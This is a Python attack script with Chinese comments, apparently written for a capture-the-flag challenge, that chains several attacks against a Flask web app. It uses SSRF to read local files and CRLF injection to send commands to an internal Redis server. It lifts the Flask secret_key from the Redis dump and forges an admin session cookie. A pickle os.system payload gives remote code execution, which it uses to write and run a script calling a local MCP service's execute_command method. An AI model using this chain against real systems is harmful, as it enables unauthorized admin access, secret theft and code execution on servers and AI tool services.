# -*- coding: utf-8 -*-
"""
SSRF + Flask Session Cookie 伪造攻击脚本
目标：获取admin权限并访问/admin/user，攻击MCP服务

攻击链：
SSRF -> 信息泄露 -> 内网Redis利用 -> 会话伪造 -> 反序列化RCE
"""

import time
import re
import base64
import pickle
import requests

# ============== 配置区 ==============
TARGET_URL = "http://b291fcc6-d953-4fa2-a1a7-1f37c3594fb1.64.dart.ccsssc.com"  # CTF靶机地址
SSRF_ENDPOINT = "/api/avatar/download"  # SSRF漏洞端点
LOGIN_ENDPOINT = "/api/login"
REGISTER_ENDPOINT = "/api/register"
ADMIN_USERS_ENDPOINT = "/admin/users"

# Redis配置
REDIS_HOST = "localhost"
REDIS_PORT = 6379
REDIS_PASSWORD = "redispass123"
REDIS_DUMP_PATH = "/var/lib/redis/dump.rdb"

# MCP攻击相关
SCRIPT_FILE = "/tmp/mcp_attack.py"
SCRIPT_BASE64_FILE = "/tmp/mcp_attack_base64.txt"
RESULT_FILE = "/tmp/mcp_attack_result.txt"


# ============== 辅助函数 ==============
def register(username, password):
    """注册用户"""
    try:
        resp = requests.post(
            f"{TARGET_URL}{REGISTER_ENDPOINT}",
            json={"username": username, "password": password},
            timeout=10
        )
        if resp.status_code == 200:
            print(f"[+] 注册成功: {username}")
            return True
        else:
            print(f"[-] 注册失败: {resp.text}")
            return False
    except Exception as e:
        print(f"[-] 注册异常: {e}")
        return False


def login(username, password):
    """登录用户，返回session"""
    try:
        session = requests.Session()
        resp = session.post(
            f"{TARGET_URL}{LOGIN_ENDPOINT}",
            json={"username": username, "password": password},
            timeout=10
        )
        if resp.status_code == 200:
            print(f"[+] 登录成功: {username}")
            return session
        else:
            print(f"[-] 登录失败: {resp.text}")
            return None
    except Exception as e:
        print(f"[-] 登录异常: {e}")
        return None


def exploit_ssrf_file_read(session, file_path):
    """
    利用SSRF漏洞读取本地文件
    使用file://协议读取服务器本地文件
    """
    try:
        # 构造file://协议URL
        ssrf_url = f"file://{file_path}"

        resp = session.get(
            f"{TARGET_URL}{SSRF_ENDPOINT}",
            params={"url": ssrf_url},
            timeout=15
        )

        if resp.status_code == 200:
            print(f"[+] 成功读取文件: {file_path}")
            return resp.text
        else:
            print(f"[-] 读取文件失败: {file_path}, 状态码: {resp.status_code}")
            return None
    except Exception as e:
        print(f"[-] SSRF读取异常: {e}")
        return None


def parse_redis_config(redis_conf):
    """
    解析Redis配置信息
    从redis.conf中提取密码、绑定地址、端口等关键信息
    """
    config = {
        "host": "127.0.0.1",
        "port": 6379,
        "password": None,
        "dbfilename": "dump.rdb",
        "dir": "/var/lib/redis"
    }

    if not redis_conf:
        return config

    lines = redis_conf.split('\n')
    for line in lines:
        line = line.strip()
        # 跳过注释和空行
        if not line or line.startswith('#'):
            continue

        # 解析requirepass（密码）
        if line.startswith('requirepass'):
            parts = line.split(None, 1)
            if len(parts) >= 2:
                config["password"] = parts[1].strip('"\'')
                print(f"[+] 提取到Redis密码: {config['password']}")

        # 解析bind（绑定地址）
        elif line.startswith('bind'):
            parts = line.split(None, 1)
            if len(parts) >= 2:
                # 可能绑定多个地址，取第一个
                config["host"] = parts[1].split()[0]
                print(f"[+] 提取到Redis绑定地址: {config['host']}")

        # 解析port（端口）
        elif line.startswith('port'):
            parts = line.split(None, 1)
            if len(parts) >= 2:
                try:
                    config["port"] = int(parts[1])
                    print(f"[+] 提取到Redis端口: {config['port']}")
                except ValueError:
                    pass

        # 解析dbfilename（数据库文件名）
        elif line.startswith('dbfilename'):
            parts = line.split(None, 1)
            if len(parts) >= 2:
                config["dbfilename"] = parts[1].strip('"\'')

        # 解析dir（数据目录）
        elif line.startswith('dir'):
            parts = line.split(None, 1)
            if len(parts) >= 2:
                config["dir"] = parts[1].strip('"\'')

    return config


def exploit_crlf_redis_command(session, redis_config, commands):
    """
    利用Python urllib的CRLF注入漏洞向Redis注入命令
    通过%0d%0a注入换行符，拼接Redis命令

    典型请求样例：
    http://localhost:6379/%0d%0aAUTH%20redispass123%0d%0aSAVE%0d%0a

    注意：CVE-2019-9740, CVE-2019-9947 - Python < 3.7.4 urllib CRLF注入
    """
    host = redis_config.get("host", "localhost")
    port = redis_config.get("port", 6379)
    password = redis_config.get("password", "")

    # 构造CRLF注入payload
    # %0d%0a = \r\n (CRLF)
    crlf = "%0d%0a"

    # 构建命令序列
    cmd_sequence = ""

    # 如果有密码，先认证
    # 注意：密码中的特殊字符需要URL编码，但不要对%本身再编码
    if password:
        # 手动编码密码，避免双重编码
        encoded_password = password.replace(" ", "%20").replace("\r", "").replace("\n", "")
        cmd_sequence += f"{crlf}AUTH%20{encoded_password}"

    # 添加用户命令
    for cmd in commands:
        # 将命令中的空格替换为%20，其他特殊字符也需处理
        encoded_cmd = cmd.replace(" ", "%20")
        cmd_sequence += f"{crlf}{encoded_cmd}"

    # 构造最终的SSRF URL
    ssrf_url = f"http://{host}:{port}/{cmd_sequence}{crlf}"

    try:
        resp = session.get(
            f"{TARGET_URL}{SSRF_ENDPOINT}",
            params={"url": ssrf_url},
            timeout=15
        )
        return resp
    except Exception as e:
        print(f"[-] CRLF注入执行异常: {e}")
        return None


def exploit_save_and_read_dump(session, redis_config):
    """
    使用SAVE命令创建dump文件并通过SSRF读取

    执行逻辑：
    1. SSRF让服务器访问localhost:6379
    2. 通过%0d%0a注入换行，拼接Redis命令
    3. AUTH完成认证，SAVE触发持久化
    4. 读取/var/lib/redis/dump.rdb，提取secret_key
    """
    # 步骤1：执行SAVE命令，触发Redis持久化
    print("[*] 执行Redis SAVE命令...")
    commands = ["SAVE"]
    exploit_crlf_redis_command(session, redis_config, commands)

    # 等待SAVE完成
    time.sleep(2)

    # 步骤2：通过SSRF读取dump.rdb文件
    dump_dir = redis_config.get("dir", "/var/lib/redis")
    dump_file = redis_config.get("dbfilename", "dump.rdb")
    dump_path = f"{dump_dir}/{dump_file}"

    print(f"[*] 读取Redis dump文件: {dump_path}")
    dump_content = exploit_ssrf_file_read(session, dump_path)

    return dump_content


def extract_secret_key_from_dump(dump_content):
    """
    从Redis dump文件中提取Flask secret_key
    支持多种格式：RDB二进制、纯文本、各种键名
    """
    if not dump_content:
        print("[-] dump内容为空")
        return None

    secret_key = None

    # 将内容转为bytes
    if isinstance(dump_content, str):
        dump_bytes = dump_content.encode('latin-1', errors='ignore')
    else:
        dump_bytes = dump_content

    print(f"[*] dump文件大小: {len(dump_bytes)} 字节")
    print(f"[*] dump前200字节(hex): {dump_bytes[:200].hex()}")
    print(f"[*] dump可打印内容: {dump_bytes[:500]}")

    # 常见的secret_key键名列表
    key_names = [
        b'app:secret_key',
        b'secret_key',
        b'SECRET_KEY',
        b'flask_secret',
        b'session_secret',
        b'app_secret',
    ]

    # 方法1：搜索所有可能的键名
    for key_name in key_names:
        if key_name in dump_bytes:
            print(f"[+] 找到键名: {key_name.decode()}")
            idx = dump_bytes.find(key_name)

            # RDB格式中，值通常在键名后面，可能有长度前缀字节
            # 提取键名后200字节进行分析
            after_key = dump_bytes[idx:idx + 200]
            print(f"[*] 键名位置 {idx}，后续200字节:")
            print(f"    Hex: {after_key.hex()}")
            print(f"    Raw: {after_key}")

            # 在键名后查找可打印字符串（跳过键名本身）
            value_start = len(key_name)
            value_area = after_key[value_start:value_start + 100]

            # 提取连续的可打印ASCII字符
            printable = b''
            for i, b in enumerate(value_area):
                if 32 <= b <= 126:  # 可打印ASCII
                    printable += bytes([b])
                elif len(printable) > 10:  # 已经收集到足够长的字符串
                    break
                else:
                    printable = b''  # 重置

            if len(printable) >= 16:
                secret_key = printable.decode('ascii')
                print(f"[+] 提取到secret_key: {secret_key}")
                return secret_key

    # 方法2：匹配各种长度的十六进制字符串 (16-128字符)
    hex_patterns = [
        rb'[0-9a-fA-F]{64}',  # 64字符 (256位)
        rb'[0-9a-fA-F]{32}',  # 32字符 (128位)
        rb'[0-9a-fA-F]{48}',  # 48字符
        rb'[0-9a-fA-F]{40}',  # 40字符 (SHA1)
    ]

    for pattern in hex_patterns:
        matches = re.findall(pattern, dump_bytes)
        if matches:
            print(f"[+] 找到 {len(matches)} 个匹配 {pattern.decode()} 的字符串")
            for match in matches[:3]:
                print(f"    候选: {match.decode()}")
            # 返回第一个匹配
            secret_key = matches[0].decode()
            return secret_key

    # 方法3：查找dart{}格式的flag（可能secret_key就是flag）
    flag_match = re.search(rb'dart\{[^}]+\}', dump_bytes)
    if flag_match:
        flag = flag_match.group().decode()
        print(f"[+] 直接找到flag: {flag}")
        return flag

    # 方法4：提取所有长度>=16的可打印字符串
    print("[*] 尝试提取所有可打印字符串...")
    printable_strings = re.findall(rb'[\x20-\x7e]{16,}', dump_bytes)
    if printable_strings:
        print(f"[+] 找到 {len(printable_strings)} 个可打印字符串:")
        for s in printable_strings[:10]:
            print(f"    {s.decode()}")
        # 返回最长的一个作为候选
        longest = max(printable_strings, key=len)
        secret_key = longest.decode()

    return secret_key


def forge_flask_session(secret_key, username):
    """
    伪造Flask session cookie
    使用itsdangerous库签名session数据
    """
    try:
        import hashlib
        from itsdangerous import URLSafeTimedSerializer
        from flask.sessions import TaggedJSONSerializer

        # Flask默认的session序列化器
        serializer = TaggedJSONSerializer()

        # 注意：digest_method 必须是函数对象，不是字符串
        signer_kwargs = {
            'key_derivation': 'hmac',
            'digest_method': hashlib.sha1
        }

        s = URLSafeTimedSerializer(
            secret_key,
            salt='cookie-session',
            serializer=serializer,
            signer_kwargs=signer_kwargs
        )

        # 构造admin用户的session数据
        session_data = {
            'username': username,
            'user_id': 1,  # admin通常是ID 1
            'is_admin': True,
            'logged_in': True
        }

        # 签名生成cookie
        forged_cookie = s.dumps(session_data)
        print(f"[+] 成功伪造{username}用户的session cookie")
        print(f"[+] Cookie: {forged_cookie[:50]}...")

        return forged_cookie

    except ImportError:
        print("[-] 需要安装itsdangerous和flask库")
        print("[-] pip install itsdangerous flask")
        return None
    except Exception as e:
        print(f"[-] 伪造session失败: {e}")
        return None


def init_attack_session(config, forged_cookie):
    """初始化攻击会话，携带伪造的cookie"""
    session = requests.Session()
    session.cookies.set('session', forged_cookie)
    return session


def access_admin_users(forged_cookie):
    """
    使用伪造的cookie访问管理员后台接口
    验证权限是否有效
    """
    try:
        session = requests.Session()
        session.cookies.set('session', forged_cookie)

        resp = session.get(
            f"{TARGET_URL}{ADMIN_USERS_ENDPOINT}",
            timeout=10
        )

        print(f"[*] 访问管理员接口状态码: {resp.status_code}")
        if resp.status_code == 200:
            print("[+] 成功访问管理员后台！")
            print(f"[+] 响应内容: {resp.text[:500]}...")

        return resp

    except Exception as e:
        print(f"[-] 访问管理员接口异常: {e}")
        return None


class PickleRCE:
    """Pickle反序列化RCE payload生成器"""

    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        import os
        return (os.system, (self.cmd,))


def exploit_pickle_rce(session, redis_config, cmd):
    """
    Pickle反序列化RCE命令执行

    攻击原理：
    1. 构造恶意pickle payload
    2. 通过CRLF注入将payload写入Redis（使用二进制安全的方式）
    3. 触发目标应用反序列化执行命令

    注意：目标应用必须存在pickle.loads()对Redis数据的反序列化
    """
    print(f"[*] 执行RCE命令: {cmd}")

    # 生成pickle payload
    payload = pickle.dumps(PickleRCE(cmd))

    # Redis需要存储原始bytes，但CRLF注入通过HTTP传输
    # 方案1：使用十六进制编码，目标如果有hex解码则可用
    # 方案2：直接base64，假设目标会base64解码后再pickle.loads
    # 这里假设目标应用会对Redis值做base64解码后反序列化
    # 使用标准base64编码（目标应用使用标准b64decode解码）
    payload_b64 = base64.b64encode(payload).decode()

    # 构造Redis SET命令，写入恶意序列化数据
    # 目标应用会读取online-user:xxx键并反序列化
    redis_key = "online-user:attacker"

    # 使用Redis协议格式写入
    commands = [
        f'SET {redis_key} {payload_b64}'
    ]

    result = exploit_crlf_redis_command(session, redis_config, commands)

    # 触发反序列化（访问在线用户页面）
    # 目标应用的/admin/online-users会遍历online-user:*键并反序列化
    try:
        session.get(f"{TARGET_URL}/admin/online-users", timeout=10)
    except Exception:
        pass

    return result


def read_rce_result(session, file_path):
    """读取RCE执行结果"""
    return exploit_ssrf_file_read(session, file_path)


# ============== MCP攻击相关函数 ==============
def get_mcp_attack_script():
    """生成MCP攻击脚本内容"""
    # 注意：这里的换行符在写入文件后会正确解析
    script = """#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import json
import socket
import os

RESULT_FILE = "/tmp/mcp_attack_result.txt"

def attack_mcp():
    results = []
    mcp_ports = [3000, 8080, 9000]

    for port in mcp_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex(('127.0.0.1', port))

            if result == 0:
                results.append(f"[+] MCP服务发现: 127.0.0.1:{port}")
                sock.send(b'{"method": "execute_command", "params": {"cmd": "id"}}' + b'\\n')
                response = sock.recv(4096)
                results.append(f"[+] 响应: {response.decode()}")

            sock.close()
        except Exception as e:
            results.append(f"[-] 端口{port}连接失败: {e}")

    with open(RESULT_FILE, 'w') as f:
        f.write("\\n".join(results))

    return results

if __name__ == '__main__':
    attack_mcp()
"""
    return script


def attack_mcp_server(session, redis_config, forged_cookie):
    """
    攻击MCP服务的核心函数

    攻击步骤：
    1. 通过RCE写入利用mcp的python脚本到/tmp/目录
    2. 执行脚本，调用mcp的execute_command方法
    3. 读取攻击结果
    """
    # 获取攻击脚本内容
    script_content = get_mcp_attack_script()
    script_b64 = base64.b64encode(script_content.encode()).decode()

    # 步骤1：base64编码后写入文件，避免特殊字符转义问题
    print("[*] 写入MCP攻击脚本...")
    write_cmd1 = f"echo '{script_b64}' > {SCRIPT_BASE64_FILE}"
    write_cmd2 = f"base64 -d {SCRIPT_BASE64_FILE} > {SCRIPT_FILE}"
    # 【修复】移除chmod +x，/tmp可能挂载noexec，直接用python3解释执行无需执行权限

    exploit_pickle_rce(session, redis_config, write_cmd1)
    time.sleep(1)
    exploit_pickle_rce(session, redis_config, write_cmd2)
    time.sleep(2)

    # 步骤2：执行攻击脚本
    print("[*] 执行MCP攻击脚本...")
    execute_cmd = f"python3 {SCRIPT_FILE}"
    exploit_pickle_rce(session, redis_config, execute_cmd)

    # 等待执行完成
    time.sleep(3)

    # 步骤3：读取攻击结果
    print("[*] 读取攻击结果...")
    result = read_rce_result(session, RESULT_FILE)

    if result:
        print("[+] MCP攻击结果:")
        print(result)
    else:
        print("[-] 未能读取到攻击结果")

    print("[+] MCP攻击完成")
    return result


# ============== 主攻击流程 ==============
def main():
    print("=" * 60)
    print("[*] SSRF + Flask Session Cookie 伪造攻击脚本")
    print("[*] 攻击链: SSRF -> Redis利用 -> 会话伪造 -> RCE -> MCP攻击")
    print("=" * 60)

    # 步骤1：注册并登录普通用户
    username = f"attacker_{int(time.time())}"
    password = "AttackPass123"

    print(f"\n[+] 步骤1：注册用户 {username}")
    register(username, password)

    print(f"\n[+] 步骤2：登录用户 {username}")
    session = login(username, password)
    if not session:
        print("[-] 登录失败，退出")
        return

    # 步骤3：利用SSRF读取Redis配置文件
    print("\n[+] 步骤3：利用SSRF漏洞读取/etc/redis/redis.conf")
    redis_conf = exploit_ssrf_file_read(session, "/etc/redis/redis.conf")

    if redis_conf:
        print(redis_conf[:500])
        if len(redis_conf) > 500:
            print("[*] 内容已截断...")
    else:
        print("[-] 无法读取Redis配置，使用默认配置")
        redis_conf = f"requirepass {REDIS_PASSWORD}\nbind 0.0.0.0\nport {REDIS_PORT}"

    # 步骤4：解析Redis配置信息
    print("\n[+] 步骤4：解析Redis配置")
    redis_config = parse_redis_config(redis_conf)
    print(f"[*] Redis配置: {redis_config}")

    # 步骤5：使用SAVE命令创建dump文件并通过SSRF读取secret_key
    print("\n[+] 步骤5：通过SAVE + SSRF获取dump文件")
    dump_content = exploit_save_and_read_dump(session, redis_config)

    # 提取secret_key
    secret_key = extract_secret_key_from_dump(dump_content)

    if not secret_key:
        print("[-] 无法从dump中获取到secret_key，使用默认值")
        secret_key = "default_secret_key_for_testing"

    print(f"[+] 使用的secret_key: {secret_key}")

    # 步骤6：伪造admin用户的session cookie
    print("\n[+] 步骤6：伪造管理员session")
    forged_cookie = forge_flask_session(secret_key, "admin")

    if not forged_cookie:
        print("[-] 无法伪造session，攻击流程退出")
        return

    # 步骤7：使用伪造的cookie访问管理员后台接口
    print("\n[+] 步骤7：验证伪造session的管理员权限")
    admin_response = access_admin_users(forged_cookie)

    if admin_response and admin_response.status_code == 200:
        print("[+] 攻击成功！成功获取admin权限")
    else:
        print("[-] 攻击失败，无法访问管理员页面")
        print("[*] 继续尝试后续攻击步骤...")

    # 步骤8：Pickle反序列化RCE命令执行
    print("\n[+] 步骤8：执行Pickle RCE远程命令执行")
    exploit_pickle_rce(
        session=session,
        redis_config=redis_config,
        cmd="id > /tmp/rce_result.txt"
    )
    print("[+] RCE命令执行完成")

    # 读取RCE结果
    rce_result = read_rce_result(session, "/tmp/rce_result.txt")
    if rce_result:
        print(f"[+] RCE执行结果: {rce_result}")

    # 步骤9：攻击目标MCP服务
    print("\n[+] 步骤9：执行MCP服务攻击")
    attack_mcp_server(
        session=session,
        redis_config=redis_config,
        forged_cookie=forged_cookie
    )

    print("\n" + "=" * 60)
    print("[+] 攻击脚本执行完毕！")
    print("=" * 60)


# ============== 程序入口 ==============
if __name__ == '__main__':
    main()
